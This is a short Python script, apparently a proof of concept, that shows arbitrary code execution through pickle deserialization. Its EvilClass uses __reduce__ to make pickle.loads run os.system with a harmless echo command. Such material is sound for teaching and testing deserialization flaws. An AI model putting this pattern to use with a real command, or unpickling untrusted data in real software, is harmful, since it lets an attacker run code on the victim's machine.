```python
import pickle
import os

class EvilClass(object):
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

def serialize_and_deserialize():
    serialized = pickle.dumps(EvilClass())
    deserialized = pickle.loads(serialized)
    return deserialized

if __name__ == '__main__':
    serialize_and_deserialize()
```